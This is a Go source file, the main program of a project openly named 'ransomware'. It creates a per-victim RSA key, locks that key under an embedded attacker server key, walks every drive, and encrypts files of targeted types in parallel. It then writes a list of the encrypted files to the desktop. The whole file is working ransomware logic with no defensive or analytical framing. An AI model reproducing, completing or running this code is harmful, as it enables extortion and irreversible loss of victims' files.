package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"io/fs"
	"os"
	"path/filepath"
	"ransomware/encryption"
	"ransomware/encryption/rsaLib"
	"ransomware/io"
	"ransomware/utils"
	"runtime"
	"strings"
	"sync"
	"time"
)

var (
	encryptedList []utils.FileInfo
	waitGroup     sync.WaitGroup
	sPubKey       = rsaLib.DecodeRSAPublicKey(utils.SPubKeyPem)
	NumWorkers    = runtime.NumCPU()
)

func main() {

	startTime := time.Now()

	clientPubKeys, err := generateClientKeys(sPubKey)
	if err != nil {
		panic(err)
	}

	drives := utils.GetDrives()
	encryptFiles(drives, clientPubKeys)

	defer utils.GenerateDesktopFiles(encryptedList, startTime)
}

func generateClientKeys(servPubKey *rsa.PublicKey) (*rsa.PublicKey, error) {
	cPrivKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}
	cPubKey := &(cPrivKey.PublicKey)

	privBytes := x509.MarshalPKCS1PrivateKey(cPrivKey)
	privBytesEncrypted, err := encryption.RSAAESEncrypt(privBytes, servPubKey)
	if err != nil {
		return nil, err
	}

	keyFile, err := os.Create("cPrivateKey.encrypted")
	if err != nil {
		return nil, err
	}
	_, err = keyFile.Write(privBytesEncrypted)
	if err != nil {
		return nil, err
	}

	return cPubKey, nil
}

func encryptFiles(dirPaths []string, cPubKey *rsa.PublicKey) {

	var filesToVisit = make(chan io.File)
	var ext string
	var err error

	waitGroup.Add(1)
	go func() {
		for _, dirPath := range dirPaths {
			filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {

				if d.IsDir() {

					if utils.Contains(utils.FoldersToSkip, filepath.Base(path)) {
						return filepath.SkipDir
					}
				}

				if !d.IsDir() {
					info, err := d.Info()
					if err != nil {
						return err
					}
					ext = filepath.Ext(path)
					ext = strings.ToLower(ext)
					if len(ext) > 1 && ext != ".encrypted" {
						filesToVisit <- io.File{Info: info, Path: path, Extension: ext[1:]}
					}
				}
				return nil
			})
		}

		close(filesToVisit)
		defer waitGroup.Done()
	}()

	for i := 0; i < NumWorkers; i++ {
		waitGroup.Add(1)
		go func() {
			for file := range filesToVisit {
				_, mapContains := utils.FileType[file.Extension]

				if mapContains {
					err = io.EncryptFile(&file, encryption.RSAAESEncrypt, cPubKey)
					if err == nil {
						encryptedList = append(encryptedList, utils.FileInfo{
							Path: file.Path, Size: int(file.Info.Size())})
					}
				}
			}
			defer waitGroup.Done()
		}()
	}

	waitGroup.Wait()
}
